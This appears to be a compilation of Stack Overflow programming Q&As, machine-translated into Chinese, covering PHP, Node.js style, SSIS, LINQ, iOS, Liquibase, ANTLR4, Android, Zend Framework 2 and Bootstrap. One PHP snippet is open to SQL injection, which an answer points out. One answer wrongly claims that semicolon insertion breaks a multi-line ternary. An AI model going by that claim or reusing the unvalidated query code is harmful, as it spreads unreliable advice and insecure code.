echo json_encode($array_to_return);    // the only thing you echo out in your php! 
```

然后，在 javascript 中，您可以使用[`$.getJSON`](http://api.jquery.com/jQuery.getJSON/)代替`$.get`：

```
$.getJSON('jQuery/data.php?Con&userHP&perc' , { userID: xUserID } ,
    function(output) {
        $('#userHP').html(output.html).show();
        var o = document.getElementById("userHealthbar");
        o.style.width= output.value ;
    }
); 
```

# node.js - 在 Node.js 中，不应在单行上使用三元运算符。为什么？

> ID：14832856
> 
> 赞同：4
> 
> 时间：2013-02-12T12:43:01.710
> 
> 标签：node.js, coding-style, standards

考虑以下示例代码：

**1.样品**

```
var IsAdminUser = (User.Privileges == AdminPrivileges)
  ? 'yes'
  : 'no';
console.log(IsAdminUser); 
```

**2.样品**

```
var IsAdminUser = (User.Privileges == AdminPrivileges)?'yes': 'no';
console.log(IsAdminUser); 
```

我对第二个示例非常满意，并且我以这种风格编写代码，但有人告诉我这是[错误](https://github.com/felixge/node-style-guide#use-multi-line-ternary-operator)的做法，没有任何支持理由。

为什么不建议在 Node.js 中使用单行三元运算符？

任何人都可以解释为什么会这样吗？

提前感谢您的大力帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T12:48:09.683

对于所有编码标准，它们通常是为了可读性和可维护性。我的猜测是作者发现它在单独的行中更具可读性。您的语言的编译器/解释器将完全一样地处理它。只要你/你的项目有一个固定的标准并坚持下去，你会没事的。我建议在项目中的每个人都对标准进行研究或至少对其进行审查，然后再将其固定下来。我认为如果你像这样在单独的行上分解它，你也可以定义一个 if/else 条件块并使用它。

警惕没有正当理由的编码标准规则。

就个人而言，我不喜欢三元运算符，因为它对我来说感觉不自然，而且我总是需要读几遍才能理解它在做什么。我发现单独的 if/else 块更容易阅读。当然是个人喜好。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-08-21T21:23:08.357

`?`将 放在新行上实际上是错误的；即使它在实践中没有伤害。

原因是一个名为“<a href="http://www.ecma-international.org/ecma-262/7.0/index.html#sec-automatic-semicolon-insertion" rel="noreferrer">Automatic 的 JS 功能分号插入”。当`var`语句以换行符结尾时（没有尾随逗号，这表明要遵循更多声明），您的 JS 解释器*应*自动插入分号。

该分号将具有`IsAdminUser`分配一个布尔值的效果（即 的结果`User.Privileges == AdminPrivileges`）。之后，一个新的（无效的）表达式将以您认为是三元运算符的问号开头。

如前所述，大多数 JS 解释器都足够聪明，可以识别出你不应该有一个换行符，并隐含地修复你的三元运算符。而且，在缩小脚本时，无论如何都会删除换行符。

因此，在实践中没有问题，但是您依赖于对常见 JS 引擎的隐式修复。最好像这样编写三元运算符：

```
var foo = bar ? "yes" : "no"; 
```

或者，对于更大的表达式：

```
var foo = bar ?
    "The operation was successful" : "The operation has failed."; 
```

甚至：

```
var foo = bar ?
    "Congratulations, the operation was a total success!" :
    "Oh, no! The operation has horribly failed!"; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-07-27T06:40:28.430

我完全不同意提出这个建议的人。三元运算符是所有“C”风格语言（C、C++、Java、C#、Javascript 等）的标准功能，大多数使用这些语言编写代码的开发人员对单行版本完全满意。

第一个版本对我来说看起来很奇怪。如果我在维护代码并看到这一点，我会将其更正回一行。

如果您想要详细，请使用 if-else。如果您想要整洁紧凑，请使用三元组。

我的猜测是提出此建议的人对操作员不是很熟悉，因此感到困惑。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-12T12:49:43.897

因为它更容易看，更容易阅读。一目了然地看到你的第一个片段在做什么要容易得多——我什至不必读到一行的末尾。我可以简单地看一个点，并立即知道`IsAdminUser`在什么条件下会有什么值。与为什么您不会在一行上编写整个 if/else 块的原因大致相同。

请记住，这些是*风格约定*，不一定有客观（或技术）推理的支持。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-03-27T11:55:45.477

拥有的原因？和 : 在单独的行上是这样，如果您的源代码管理具有逐行比较，则更容易弄清楚发生了什么变化。

如果您刚刚更改了 ? 和 : 并且所有内容都在一行上，整行都可以标记为已更改（基于您的比较工具）。

# ssis - 如何通过 SSIS 连接到托管在 Unix 服务器上的 FTP 网站？

> ID：14832858
> 
> 赞同：0
> 
> 时间：2013-02-12T12:43:03.267
> 
> 标签：ssis

我需要将文件从文件夹位置复制到 Unix 服务器。我正在尝试在 SSIS 中使用 FTP 任务，但是在测试从 FTP 任务到 Unix 服务器的连接时，我收到以下错误消息：

### 错误信息：

```
Connection could not be established, Server Name, Port number or 
credentials might be invalid. 
```

我使用了以下凭据

```
Server Name: mohawk.am.lilly.com
port number: 22 
```

我提供了一个有效的用户名和密码。当我测试连接时，我收到错误消息。

有人可以指出我在这里做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:58:06.740

Port number **`22`** is associated with *`Secure FTP (SFTP)`*. You need to use port **`21`** to connect to *`FTP`*, if that is what you are trying to do.

*`FTP Task`* in SSIS is not capable to perform Secure FTP (SFTP) operations. Read more about other options to perform SFTP within SSIS in this MSDN forums answer:

[*Can SSIS do SFTP? and how?*](http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/00043b62-d243-427a-8118-3b40e9281050/)

# javascript - 如何绑定到文本下拉列表？

> ID：14832862
> 
> 赞同：0
> 
> 时间：2013-02-12T12:43:21.603
> 
> 标签：javascript, kendo-ui

我有 kendoui 下拉列表。我需要绑定到选定的文本。

源代码：

```
<span style="" class="k-widget k-dropdown k-header" unselectable="on" role="listbox" aria-haspopup="true" aria-expanded="false" tabindex="0" aria-owns="Pests_listbox" aria-busy="false" aria-activedescendant="Pests_option_selected">
     <span class="k-dropdown-wrap k-state-default k-state-focused" unselectable="on">
     <span class="k-input" unselectable="on">Big Headed Ants</span>
     <span class="k-select" unselectable="on">
     <span class="k-icon k-i-arrow-s" unselectable="on">select</span>
     </span>
     </span>
<input type="hidden" data-bind="events: { select: roleSelected }, value: pets.id, text: pets.name" name="Pets" id="Pets" value="ABTB" data-role="dropdownlist" style="display: none;"></span> 
```

值绑定成功，但文本未绑定 =(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T00:52:21.657

据我了解，您应该有一个如下所示的 HTML：

```
<input name="Pets" id="Pets"
       data-text-field="name"
       data-value-field="id"
       data-bind="events: { select: roleSelected }, source: pets"
       value="ABTB" data-role="dropdownlist"/> 
```

那么你的 JavaScript 应该是：

```
var viewModel = kendo.observable({
    roleSelected: function (e) {
        console.log("roleSelected", e);
    },
    pets        : [
        {id: 1, name: "name1" },
        {id: 2, name: "name2" },
        {id: 3, name: "name3" },
        {id: 4, name: "name4" },
        {id: 5, name: "name5" },
        {id: 6, name: "name6" },
        {id: 7, name: "ABTB" }
    ]
});
kendo.bind($("#Pets"), viewModel); 
```

如您所见，事件监听器 ( `roleSelected`) 是模型 ( `viewModel`) 中定义的函数。

# c# - Linq，过滤掉倍数

> ID：14832869
> 
> 赞同：1
> 
> 时间：2013-02-12T12:43:39.260
> 
> 标签：c#, linq

我在我的 MVC 项目中编写了一个搜索功能，它匹配一个数据库。

数据库有这样的结构：

名称 - 字符串（数据的名称）

SubName - 字符串（数据的子名称）

SomeData - int（实际数据）

因此，如果我有 100 个帖子，其名称和特定子名称具有不同的数据值。然后还有 100 个帖子名称相同但子名称不同。

现在，当我搜索数据库时，我使用这个 linq 代码；

```
 var names = db.Graphs
            .Where(r => r.Name.Contains(term))
            .Take(5).Distinct()
            .Select(r=> new {label = r.Name}); 
```

我认为那个maby会得到5个不同的答案，但它并不...

我得到前 100 个帖子中的 5 个，我想过滤，以便我只使用带有子名的唯一名称。因此，在上面的示例中，我将恢复 2 个条目。

感觉就像我已经尝试了一切并且失败了，所以任何输入都会被应用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T13:12:42.203

```
 var names = db.Graphs
    .Where(r => r.Name.Contains(term))
    .GroupBy(s=>s.Name).Take(5)
    .Select(r => new { label = r.FirstOrDefault().Name }); 
```

您应该在 Take() 之前应用 Distinct()。我希望这会有所帮助。

# ios - 更新 UITableView 中的所有单元格

> ID：14832871
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:43:45.680
> 
> 标签：ios, uitableview

我有一个方法，我想在 UITableView 中的每个单元格上运行，它会**更新每个单元格中的属性**（因此显示会反映更改）。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:46:48.353

“单元格”不应该真正保存任何信息，因此您不会真正更新单元格。

您更新用于存储数据的数据模型（即数组或其他），然后显示在表中。

然后，当您想“更新单元格”时，您只需更新数据模型数据，然后重新加载表格...

```
[self.tableView reloadData]; 
```

# java - Liquibase：附近的语法不正确；

> ID：14832874
> 
> 赞同：6
> 
> 时间：2013-02-12T12:43:53.170
> 
> 标签：java, sql-server-2008, liquibase

我正在尝试使用 Liquibase 部署数据库更改，并在其中一个存储过程代码上出现以下错误。

```
SET NOCOUNT ON: Incorrect syntax near 'ON'.
    at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:62)
    at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:104)
    at liquibase.database.AbstractDatabase.execute(AbstractDatabase.java:1075)
    at liquibase.database.AbstractDatabase.executeStatements(AbstractDatabase.java:1059)
    at liquibase.changelog.ChangeSet.execute(ChangeSet.java:317)
    ... 5 more
Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: Incorrect syntax near 'ON'.
    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:197)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(SQLServerStatement.java:1493)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(SQLServerStatement.java:775)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement$StmtExecCmd.doExecute(SQLServerStatement.java:676)
    at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:4575)
    at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1400)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(SQLServerStatement.java:179)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(SQLServerStatement.java:154)
    at com.microsoft.sqlserver.jdbc.SQLServerStatement.execute(SQLServerStatement.java:649)
    at liquibase.executor.jvm.JdbcExecutor$1ExecuteStatementCallback.doInStatement(JdbcExecutor.java:92)
    at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55) 
```

sp 看起来像：

```
 CREATE PROCEDURE [dbo].[TestSP] 
    AS
    BEGIN

        SET NOCOUNT ON;

        SELECT Col1, Col2
        FROM dbo.[Table1] 

    END
    GO
GRANT EXECUTE ON [dbo].[testsp] TO [SomeRole]
GO 
```

变更集看起来像：

```
<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog xmlns="http://www.liquibase.org/xml/ns/dbchangelog" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog          http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">

  <changeSet id="6a07201a-133e-4613-b4cf-15becbf53baf" author="Nadeem">

    <sqlFile path="./Creation Scripts/Stored Procedures/testsp.sql" />
    <rollback>
      <sqlFile path="./Update Scripts/Stored Procedures/testsp.Rollback.sql" />
    </rollback>
  </changeSet>
</databaseChangeLog> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T13:57:47.570

看起来您使用了[`<sql>`](http://www.liquibase.org/manual/custom_sql)or[`<sqlFile>`](http://www.liquibase.org/manual/custom_sql_file)重构标签。他们会自动将您的查询拆分为`;`和`GO`。在这种情况下，这不是你想要的。

您可以将属性设置`splitStatements`为`false`或使用[`<createProcedure>`](http://www.liquibase.org/manual/create_stored_procedure)重构标签。

# iphone - 自动续订订阅错误

> ID：14832879
> 
> 赞同：2
> 
> 时间：2013-02-12T12:44:12.447
> 
> 标签：iphone, in-app-purchase, subscription, newsstand-kit, auto-renewing

我正在开发一个报亭应用程序，该应用程序具有自动更新订阅，每 12 个月更新一次。问题是当已经订阅的用户尝试再次购买订阅时。根据文档，`SKPaymentTransactionStateRestored`如果用户已经订阅，StoreKit 框架应该返回，但它`SKPaymentTransactionStateFailed`在 StoreKit 委托方法中返回：

```
- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions 
```

脚步：

1.  购买自动续订订阅
2.  购买成功后，再次删除并重新安装应用程序。
3.  再次使用相同的 Apple ID 和密码购买自动续订订阅，或尝试使用相同的 Apple ID 在不同设备上购买相同的订阅。

我怀疑它不是恢复以前的购买，而是提出新的购买请求并相应地更新订阅期。

这不是基于帐户的应用程序，因此我无法在服务器上存储和检查订阅期。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T15:00:41.377

您应该在应用程序中添加两个按钮：

*   购买 - 将只购买自动续订订阅
*   恢复 - 将尝试恢复现有订阅`[[SKPaymentQueue defaultQueue] restoreCompletedTransactions]`

您可以在用户界面中为用户写一些解释，例如“如果您已经购买了此订阅，请点击恢复”

这种技术是在 Apple 的三到四次拒绝中发明的，因为“用户应该有能力恢复他们的订阅”，“如果他不期望密码提示，用户不应该得到密码提示”（它在恢复已完成的交易时要求用户通过）， 等等。

# ssrs-2008 - SSRS：如何将图表绑定到垂直标题栏 (tablix)？

> ID：14832881
> 
> 赞同：1
> 
> 时间：2013-02-12T12:44:19.617
> 
> 标签：ssrs-2008, reporting-services, ssrs-tablix

这将是我在这个论坛上的第一个问题 :-) 但是，我目前对我的一个 SSRS 报告有疑问。该报告由图表/图表组成。我在图表下方放置了一个带有一些度量的垂直标题栏。这是一个相当长的标题栏，需要用户在栏上垂直滚动到右侧才能看到 SSAS 多维数据集的最后一个度量。

当他们这样做时，图形/图表固定在其“正常位置”。

是否存在将图形“绑定”到标题栏的任何方式，以便在用户向右滚动时它会跟随？

感谢您的各种输入！我在这里完全迷失了:)

尼克拉斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T11:24:32.503

抱歉，这**不是**SSRS 中的功能。

* * *

但是我会按照@GilPeretz 的建议去做。在这个解决方法中，我会：

1.  删除当前标题；
2.  减小图表大小；和
3.  在适当的地方放置两个或三个标题。

# antlr4 - 使用 ANTLR4 的岛解决方案

> ID：14832882
> 
> 赞同：0
> 
> 时间：2013-02-12T12:44:21.000
> 
> 标签：antlr4

我想与您分享一个我必须在 ANTLR4 中实施的孤岛解决方案。

1.  语言的结构。我必须为其编写语法的语言源自 PL/SQL，并带有一些额外的结构。我不会在这里详细介绍，因为这是题外话。
2.  `PUT`该语言定义了一个具有以下结构的特殊命令：

    `PUT [<SPECIALISED LANGUAGE>]`.

**我的解决方案是：**

1.  覆盖 Lexer 的`nextToken`方法：

    ```
    public Token nextToken() {
        if (f_current_idx != -1) {
            _input.seek(f_current_idx); f_current_idx = -1;
        }
        Token l_token = super.nextToken(); return l_token;
    } 
    ```

2.  在 Lexer 中添加一些代码：

    ```
    PUT :
    'PUT'
    {
        f_current_idx = _input.index(); ((ANTLRStringStream) _input).rewind();

        SRC_PUTLexer l_put_lexer = new SRC_PUTLexer(_input);
        UnbufferedTokenStream<Token> l_tokenStream = new UnbufferedTokenStream<Token>(l_put_lexer);

        if (l_tokenStream.LA(2) == SRC_PUTLexer.LBRACK) { 
            new SRC_PUTParser(l_tokenStream).start_rule(); f_current_idx = _input.index();
        } 
    }; 
    ```

此外`ANTLRStringStream`，必须定义在 ANTLR 4 中消失的类：

```
public class ANTLRStringStream extends ANTLRInputStream {

    protected int markDepth = 0;
    protected int lastMarker;

    protected ArrayList<Integer> markers;

    public ANTLRStringStream() {
        super();
    }

    public ANTLRStringStream(String input) {
        super(input);
    }

    public int mark() {
        if ( markers==null ) { markers = new ArrayList<Integer>(); }
        markers.add(markDepth, index()); markDepth++; lastMarker = markDepth;
        return markDepth;
    }

    public void rewind(int m) {
        int state = (int) markers.get(m); seek(state); release(m);
    }

    public void rewind() { rewind(lastMarker); }

    public void release(int marker) {
        markDepth = marker; markDepth--;
    }
} 
```

非常欢迎任何反馈！亲切的问候，沃尔夫冈·哈默

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T15:43:04.967

这真的应该是一个社区维基。

我的第一个**主要**评论是你需要摆脱这`ANTLRStringStream`门课。ANTLR 4 提供的[`ANTLRInputStream`](https://github.com/antlr/antlr4/blob/master/runtime/Java/src/org/antlr/v4/runtime/ANTLRInputStream.java)类提供了 ANTLR 3 中的功能。`ANTLRStringStream`和[`IntStream`](https://github.com/antlr/antlr4/blob/master/runtime/Java/src/org/antlr/v4/runtime/IntStream.java)接口[`CharStream`](https://github.com/antlr/antlr4/blob/master/runtime/Java/src/org/antlr/v4/runtime/CharStream.java)在 ANTLR 4 中进行了修改和广泛记录，以消除有问题的`rewind`方法和其他未定义的行为。你不应该重新引入它们。

# php - SQL/PHP 语法不起作用

> ID：14832884
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:44:31.443
> 
> 标签：php, sql, heidisql

我想对字符串使用 SELECT LIKE，以从表中获取一些数据。但由于某种原因，以下代码不起作用。关于为什么的任何线索？我使用 HeidiSQl 和 PHP 5.3。

```
if(isset($_GET["name"])){
                                        $id=$_GET["name"];
                                        $result = mysql_query("SELECT * FROM categorii_menu WHERE name like'$id%'");
                                        $data=mysql_fetch_row($result);
                                        echo $data[6]; //content of $id
                        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:47:52.110

尝试这个 ：

```
$result = mysql_query("SELECT * FROM categorii_menu WHERE name like '".mysql_real_escape_string($id)."%'"); 
```

**笔记 ：**

您的查询容易受到 sql 注入的影响

不推荐使用 mysql_* 函数使用 mysqli_* 或 PDO

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:59:57.317

Found the problem , it was related to my htaccess file. The syntax i posted originally is good.

# html - HTML 如何更改对象相对于另一个图像的位置

> ID：14832885
> 
> 赞同：0
> 
> 时间：2013-02-12T12:44:37.143
> 
> 标签：html, css-float, centering

对于我的网站，我有一个显示屏幕的图像。在该屏幕内，我已在该屏幕内移动了一个嵌入的 youtube 视频。所以嵌入是在图像的顶部。我可以使用以下方法将嵌入的视频放入正确的位置：

```
<div style="position:relative"> 
  <img src="screen.png" />
  <div style="position:absolute; left:0px;top:0px;">    
    <embed src="http://www.youtube.com/embed/qoSEzTpbxP4" width="310" height="210" allowfullscreen=true"></embed>           
  </div>
</div> 
```

我希望整个事情都居中，但是如果我用标签包围它，那么显然没有任何中心因为位置；嵌入从窗口左侧停留 544，而不是从图像左侧。有没有办法使嵌入移动以匹配图像居中的位置？

（注意：我知道我应该为所有样式使用单独的 CSS 文档，但我现在对此不感兴趣，我只想让它工作，然后我可能会稍后将样式封装到一个单独的地方）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:50:08.863

尝试这个

```
<div style="margin: 0px auto; text-align: center; width: 500px; position: relative;"> 
  <img src="screen.png">
  <div style="position: absolute; z-index: 1; margin: 0px auto; text-align: center;">   
    <embed width="425" height="349" allowfullscreen="true&quot;" src="http://www.youtube.com/embed/qoSEzTpbxP4">           
  </div>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-29T04:54:36.080

试试这个...好看的视频帧！

```
<object height="360" width="580" id="video_MT6UDIruUkU" type="application/x-shockwave-flash"
data="http://www.youtube.com/apiplayer?enablejsapi=1&version=3">

    <param value="always" name="allowScriptAccess">
    <param value="transparent" name="wmode">
    <param value="video_id=MT6UDIruUkU&playerapiid=MT6UDIruUkU"
    name="flashvars">
    <param value="http://www.youtube.com/apiplayer?enablejsapi=1&version=3"
    name="movie">

</object>

<div class="controlDiv play"></div> 
```

# android - Android On Focus Listener 和 On Click Listener on ImageView

> ID：14832888
> 
> 赞同：3
> 
> 时间：2013-02-12T12:44:52.163
> 
> 标签：android, onclicklistener, onfocus

我有一个 imageview - 它具有两个属性 - **focusable**和**focusableintouchmode**设置为**true**

```
<ImageView
        android:id="@+id/ivMenu01"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:focusable="true"
        android:focusableInTouchMode="true" >
    </ImageView> 
```

我已经在我的活动中实现了**onFocusChangeListener -**

```
 @Override
public void onFocusChange(View v, boolean hasFocus) {
    switch (v.getId()) {
    case R.id.ivMenu01:

            if (hasFocus) {
                ivMenu01.setImageBitmap(Utility
                        .getBitmap("Home_ford_focus.png")); // Focussed image
            } else {
                ivMenu01.setImageBitmap(Utility.getBitmap("Home_ford.png")); // Normal image
            }

        break;

    default:
        break;
    }

} 
```

还有**onClickListener** -

```
 case R.id.ivMenu01:
                ivMenu01.requestFocus();
                Intent iFord = new Intent(HomeScreen.this, FordHome.class);
                startActivity(iFord);

break; 
```

现在，当我单击 ImageView 时，第一次单击将焦点放在 ImageView 上，第二次单击执行操作。我不确定为什么会这样。
第一次单击应该请求焦点并执行操作。
任何有关如何做到这一点的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T13:15:00.520

这是小部件框架的设计方式。

查看`View.onTouchEvent()`代码时，您会发现只有在视图*获得焦点*时才会执行单击操作：

```
 // take focus if we don't have it already and we should in
    // touch mode.
    boolean focusTaken = false;
    if (isFocusable() && isFocusableInTouchMode() && !isFocused()) {
        focusTaken = requestFocus();
    }

    if (!mHasPerformedLongPress) {
        // This is a tap, so remove the longpress check
        removeLongPressCallback();

        // Only perform take click actions if we were in the pressed state
        if (!focusTaken) {
            // click
        }
    } 
```

因此，正如您所注意到的，第一次单击会使视图获得焦点。第二个将触发点击处理程序，因为视图已经有了焦点。

如果你想改变*按下*`ImageView`时的位图，你应该实现一个并通过方法设置它。该侦听器应该或多或少像这样：*`View.OnTouchListener``ImageView.setOnTouchListener()`*

 *```
private View.OnTouchListener imageTouchListener = new View.OnTouchListener() {
    @Override
    public boolean onTouch(View v, MotionEvent event) {
        if (event.getAction() == MotionEvent.ACTION_DOWN) {
            // pointer goes down
            ivMenu01.setImageBitmap(Utility.getBitmap("Home_ford_focus.png"));
        } else if (event.getAction() == MotionEvent.ACTION_UP) {
            // pointer goes up
            ivMenu01.setImageBitmap(Utility.getBitmap("Home_ford.png"));
        }
        // also let the framework process the event
        return false;
    }
}; 
```

您还可以使用 Selector aka State List Drawable 来实现相同的目的。请参阅此处的参考：http: [//developer.android.com/guide/topics/resources/drawable-resource.html#StateList](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)*

# zend-framework2 - 图像大小调整 zf2

> ID：14832891
> 
> 赞同：6
> 
> 时间：2013-02-12T12:45:00.580
> 
> 标签：zend-framework2, image-resizing

我需要在 zend 框架 2 中实现图像调整大小功能（最好使用 gd2 库扩展）。

我找不到任何相同的组件/助手。有参考吗？

如果我想创建一个，我应该在哪里添加它。在旧的 Zend 框架中，有一个 Action Helper 的概念，那么 Zend 框架 2 呢？

请在此处提出最佳解决方案。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-12T13:11:13.240

我目前使用[Imagine](https://github.com/avalanche123/Imagine)和[Zend Framework 2](https://github.com/zendframework/zf2)来处理这个问题。

1.  安装想象：`php composer.phar require imagine/Imagine:0.3.*`
2.  为服务创建服务工厂`Imagine`（在 中`YourModule::getServiceConfig`）：

    ```
    return array(
        'invokables' => array(
            // defining it as invokable here, any factory will do too
            'my_image_service' => 'Imagine\Gd\Imagine',
        ),
    ); 
    ```

3.  在你的逻辑中使用它（这里是一个带有控制器的小例子）：

    ```
    public function imageAction()
    {
        $file    = $this->params('file'); // @todo: apply STRICT validation!
        $width   = $this->params('width', 30); // @todo: apply validation!
        $height  = $this->params('height', 30); // @todo: apply validation!
        $imagine = $this->getServiceLocator()->get('my_image_service');
        $image   = $imagine->open($file);

        $transformation = new \Imagine\Filter\Transformation();

        $transformation->thumbnail(new \Imagine\Image\Box($width, $height));
        $transformation->apply($image);

        $response = $this->getResponse();
        $response->setContent($image->get('png'));
        $response
            ->getHeaders()
            ->addHeaderLine('Content-Transfer-Encoding', 'binary')
            ->addHeaderLine('Content-Type', 'image/png')
            ->addHeaderLine('Content-Length', mb_strlen($imageContent));

        return $response;
    } 
    ```

这显然是“快速而肮脏”的方式，因为您应该执行以下操作（可选但可重用性良好的做法）：

1.  可能在服务中处理图像转换
2.  从服务中检索图像
3.  使用输入过滤器来验证文件和参数
4.  缓存输出（最终参见[http://zend-framework-community.634137.n4.nabble.com/How-to-handle-404-with-action-controller-td4659101.html ）](http://zend-framework-community.634137.n4.nabble.com/How-to-handle-404-with-action-controller-td4659101.html)

相关：[Zend Framework - 使用控制器返回图像/文件](https://stackoverflow.com/questions/14810805/zend-framework-returning-image-file-using-controller/14811182#14811182)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T12:56:51.420

为此使用服务并将其注入需要该功能的控制器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-01-01T10:19:48.433

这是Zend Framework 2中一个名为[WebinoImageThumb的模块。检查一下。](http://modules.zendframework.com/webino/WebinoImageThumb)它具有一些很棒的功能，例如-

*   图像调整大小
*   图像裁剪、填充、旋转、显示和保存图像
*   创建图像反射

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-01-21T16:03:08.050

对于`Imagine`像我这样无法正确整合的人..

我在这里找到了另一个解决方案[WebinoImageThumb，](https://github.com/webino/WebinoImageThumb)它对我来说非常好用。如果您不想阅读完整的文档，这里几乎没有解释：

运行：`php composer.phar require webino/webino-image-thumb:dev-develop` 并添加`WebinoImageThumb`为活动模块，`config/application.config.php`其中进一步如下所示：

```
<?php
return array(
    // This should be an array of module namespaces used in the application.
    'modules' => array(
        'Application',
        'WebinoImageThumb'
    ), 
```

..下面保持不变

现在在您的控制器操作中，通过服务定位器使用它，如下所示：

```
// at top on your controller
use Zend\Validator\File\Size;
use Zend\Validator\File\ImageSize;
use Zend\Validator\File\IsImage;
use Zend\Http\Request

    // in action
$file = $request->getFiles();
$fileAdapter = new \Zend\File\Transfer\Adapter\Http();
$imageValidator = new IsImage();
if ($imageValidator->isValid($file['file_url']['tmp_name'])) {
    $fileParts = explode('.', $file['file_url']['name']);
    $filter = new \Zend\Filter\File\Rename(array(
               "target" => "file/path/to/image." . $fileParts[1],
               "randomize" => true,
              ));

    try {
         $filePath = $filter->filter($file['file_url'])['tmp_name'];
         $thumbnailer = $this->getServiceLocator()
                        ->get('WebinoImageThumb');
         $thumb = $thumbnailer->create($filePath, $options = [], $plugins = []);
         $thumb->adaptiveResize(540, 340)->save($filePath);

      } catch (\Exception $e) {
          return new ViewModel(array('form' => $form, 
                     'file_errors' => array($e->getMessage())));
      }
  } else {
      return new ViewModel(array('form' => $form, 
                 'file_errors' => $imageValidator->getMessages()));
  } 
```

祝你好运..！！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T21:14:35.797

为了即时调整上传图像的大小，您应该这样做：

```
public function imageAction() 
{
// ...
$imagine = $this->getImagineService();
$size = new \Imagine\Image\Box(150, 150);
$mode = \Imagine\Image\ImageInterface::THUMBNAIL_INSET;

$image = $imagine->open($destinationPath);
$image->thumbnail($size, $mode)->save($destinationPath);
// ...
}

public function getImagineService()
{
    if ($this->imagineService === null)
    {
        $this->imagineService = $this->getServiceLocator()->get('my_image_service');
    }
    return $this->imagineService;
} 
```

# css - Twitter Bootstrap：响应式布局中的非响应行

> ID：14832894
> 
> 赞同：2
> 
> 时间：2013-02-12T12:45:07.067
> 
> 标签：css, twitter-bootstrap

我在我的网站上使用响应式流体网格系统，在大多数情况下，响应式引导行为是我想要的：在小屏幕上，网格列变得流畅并垂直堆叠。

但是，使用网格嵌套，在嵌套行内这并不总是所需的行为。不管屏幕有多小，有些行不应该垂直堆叠。当我完全禁用所有响应式 CSS 代码时，这正是整个网格的行为，但如果外部行需要响应式行为，显然这是没有选择的。

相关标记是：

```
<div class="container-fluid">
    <div class="row-fluid">
        <div class="span6">This column should be stacked on small devices.</div>
        <div class="span6">
            <div class="row-fluid">
                <div class="span6">Nested row. This column should NOT be stacked on small devices.</div>
                <div class="span6">Nested row. This column should NOT be stacked on small devices.</div>
            </div>
        </div>
    </div>
</div> 
```

请参阅此[jsfidde](http://jsfiddle.net/m4r73n/VzNRH/2/)以进行澄清。

如何最好地解决这个问题？有没有办法使用本机引导功能来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T13:18:29.773

```
[class*="span"] .span6 { display: inline-block; width: 48.61878453038674%} 
```

示例：http:
[//jsfiddle.net/NfTQ7/1/](http://jsfiddle.net/NfTQ7/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-11T07:45:26.130

这不是最简单的解决方案，但我发现它适合我的需求

[https://github.com/twitter/bootstrap/blob/master/less/mixins.less#L572](https://github.com/twitter/bootstrap/blob/master/less/mixins.less#L572)

如果您深入了解引导网格的源代码，则相对容易提取用于生成 span[1-12] 系统的较少代码。

所以我只是把基础知识拿出来，用不同的选择器把它们放在我自己的文件中。所以现在，当我想使用不换行的跨度时，我只使用 .naps[1-12] （跨度向后拼写）。

响应式 CSS 会查找 .span[1-12] 选择器，因此它会忽略我的 .naps 元素。

它并不优雅，也不是特别可扩展。它确实有效：-/

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:57:28.657

我为解决此类问题所做的工作如下：

```
<div class="row-fluid">
    <div id="remove-mobile" class="span6">Nested row. This column should NOT be stacked on small devices.</div>
    <div id="remove-mobile" class="span6">Nested row. This column should NOT be stacked on small devices.</div>
</div>

@media only screen and (max-width: 480px) {

    #remove-mobile {

        display:none;

    }

} 
```

